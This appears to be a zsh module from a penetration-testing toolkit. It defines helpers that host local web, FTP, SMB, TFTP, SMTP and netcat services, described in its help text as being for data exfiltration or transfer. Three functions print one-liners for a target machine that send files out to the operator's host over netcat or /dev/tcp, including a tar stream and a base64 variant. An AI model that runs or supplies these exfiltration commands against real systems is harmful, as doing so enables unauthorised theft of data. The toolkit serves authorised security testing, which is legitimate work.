#!/usr/bin/env zsh

############################################################# 
# qq-srv
#############################################################

qq-srv-help() {
  cat << END

qq-srv
-------
The srv namespace provides commands for hosting local services
such as web, ftp, smb and other services for data exfil or transfer.

Commands
--------
qq-srv-install: install dependencies
qq-srv-web: hosts a python3 web server in current dir
qq-srv-ftp: hosts a python3 ftp server in current dir
qq-srv-smb: hosts an impacket smb server in current dir
qq-srv-tftp: starts the atftpd service in /srv/tftp
qq-srv-smtp: hosts a python3 smtp server in current dir
qq-srv-updog: hosts an updog web server in current dir
qq-srv-nc-tar: hosts a netcat server > tar file in current dir
qq-srv-nc-file: hosts a netcat server > file in current dir
qq-srv-web-srv: hosts a python3 web server in /srv, port as $1
qq-srv-php-srv: hosts a php web server in /srv, port as $1
qq-srv-ftp-srv: hosts a python3 ftp server in /srv
qq-srv-updog-srv: hosts an updog web server in /srv

END
}

qq-srv-install() {
    sudo apt-get install netcat
    sudo apt-get install atftpd
    sudo apt-get install php
    sudo apt-get install impacket-scripts
    sudo apt-get install python3 python3-pip 
    sudo apt-get install python3-smb python3-pyftpdlib
    sudo pip3 install updog
}

qq-srv-web() print -z "sudo python3 -m http.server 80"
qq-srv-ftp() print -z "sudo python3 -m pyftpdlib -p 21 -w"
qq-srv-smb() print -z "sudo impacket-smbserver -smb2supp F ."
qq-srv-tftp() print -z "sudo service atftpd start"
qq-srv-smtp() print -z "sudo python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25"

qq-srv-web-srv() {
    __info "Serving content from /srv"
    if [ "$#" -eq  "1" ]
    then
        pushd /srv &> /dev/null
        sudo python3 -m http.server $1
        popd &> /dev/null
    else
        pushd /srv &> /dev/null
        sudo python3 -m http.server 80
        popd &> /dev/null
    fi
}

qq-srv-php-srv() {
    __info "Serving content from /srv"
    if [ "$#" -eq  "1" ]
    then
        pushd /srv &> /dev/null
        sudo php -S 0.0.0.0:$1 
        popd &> /dev/null
    else
        pushd /srv &> /dev/null
        sudo php -S 0.0.0.0:80
        popd &> /dev/null
    fi
}

qq-srv-ftp-srv() {
    __info "Serving content from /srv"
    pushd /srv &> /dev/null
    sudo python3 -m pyftpdlib -p 21 -w
    popd &> /dev/null
}

qq-srv-updog() {
    print -z "updog -p 443 --ssl -p $(__rand 10)"
}

qq-srv-updog-srv() {
    __info "Serving content from /srv"
    updog -p 443 --ssl -d /srv
}

qq-srv-nc-tar() {
    qq-vars-set-lhost
    local port && read "port?$(__cyan PORT: )"
    __cyan "Use the command below on the target system: "
    echo "tar cfv - /path/to/send | nc ${_LHOST} ${port}"
    print -z "nc -nvlp ${port} | tar xfv -"
}

qq-srv-nc-file() {
    qq-vars-set-lhost
    local port && read "port?$(__cyan PORT: )"
    __cyan "Use the command below on the target system: "
    echo "cat FILE > /dev/tcp/${__LHOST}/${port}"
    print -z "nc -nvlp ${port} -w 5 > incoming.txt"  
}

qq-srv-nc-b64() {
    qq-vars-set-lhost
    local port && read "port?$(__cyan PORT: )"
    __cyan "Use the command below on the target system: "
    echo "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${port}"
    print -z "nc -nvlp ${port} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
}